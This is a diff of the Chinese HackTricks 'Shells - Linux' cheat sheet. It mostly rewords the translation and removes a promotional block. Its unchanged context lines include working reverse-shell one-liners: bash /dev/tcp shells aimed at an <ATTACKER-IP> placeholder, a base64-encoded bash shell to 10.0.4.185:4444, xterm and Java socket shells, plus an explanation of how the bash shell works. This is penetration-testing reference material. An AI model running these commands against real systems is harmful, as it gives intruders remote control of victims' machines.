@@ -1,8 +1,8 @@
 # Shells - Linux
 
 {% hint style="success" %}
-学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -15,19 +15,11 @@
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-**如果你对这些 shell 有任何问题，可以查看** [**https://explainshell.com/**](https://explainshell.com)
+**如果你对这些 shell 有任何疑问，可以查看** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
 
-**一旦你获得了反向 shell**[ **请阅读此页面以获取完整 TTY**](full-ttys.md)**.**
+**一旦你获得了反向 shell**[ **请阅读此页面以获取完整的 TTY**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -42,9 +34,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-不要忘记检查其他 shell：sh、ash、bsh、csh、ksh、zsh、pdksh、tcsh 和 bash。
+不要忘记检查其他shell：sh、ash、bsh、csh、ksh、zsh、pdksh、tcsh和bash。
 
-### 符号安全 shell
+### 符号安全shell
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -56,10 +48,10 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 #### Shell 解释
 
 1. **`bash -i`**: 该命令的这一部分启动一个交互式（`-i`）Bash shell。
-2. **`>&`**: 该命令的这一部分是**重定向标准输出**（`stdout`）和**标准错误**（`stderr`）到**同一目的地**的简写表示法。
+2. **`>&`**: 该命令的这一部分是**将标准输出**（`stdout`）和**标准错误**（`stderr`）**重定向到同一目标**的简写表示法。
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: 这是一个特殊文件，**表示与指定IP地址和端口的TCP连接**。
 * 通过**将输出和错误流重定向到此文件**，该命令有效地将交互式shell会话的输出发送到攻击者的机器。
-4. **`0>&1`**: 该命令的这一部分**将标准输入（`stdin`）重定向到与标准输出（`stdout`）相同的目的地**。
+4. **`0>&1`**: 该命令的这一部分**将标准输入（`stdin`）重定向到与标准输出（`stdout`）相同的目标**。
 
 ### 创建文件并执行
 ```bash
@@ -110,7 +102,7 @@ toboggan -m nix.py -i
 * 您的有效负载的前缀和后缀（如果有的话）
 * 发送有效负载的方式（头部？数据？额外信息？）
 
-然后，您可以直接 **发送命令**，甚至 **使用 `upgrade` 命令** 来获取完整的 PTY（注意管道的读取和写入大约有 1.3 秒的延迟）。
+然后，您可以直接 **发送命令**，甚至 **使用 `upgrade` 命令** 来获取完整的 PTY（请注意，管道的读取和写入大约有 1.3 秒的延迟）。
 
 ## Netcat
 ```bash
@@ -317,7 +309,7 @@ close(Service)
 ```bash
 xterm -display 10.0.0.1:1
 ```
-要捕获反向 shell，您可以使用（将在端口 6001 上监听）：
+要捕获反向 shell，您可以使用（将监听端口 6001）：
 ```bash
 # Authorize host
 xhost +targetip
@@ -340,23 +332,17 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-**努力安全小组**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
 {% hint style="success" %}
 学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习和实践 GCP 黑客技术： <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>支持 HackTricks</summary>
 
 * 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 **上关注我们** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
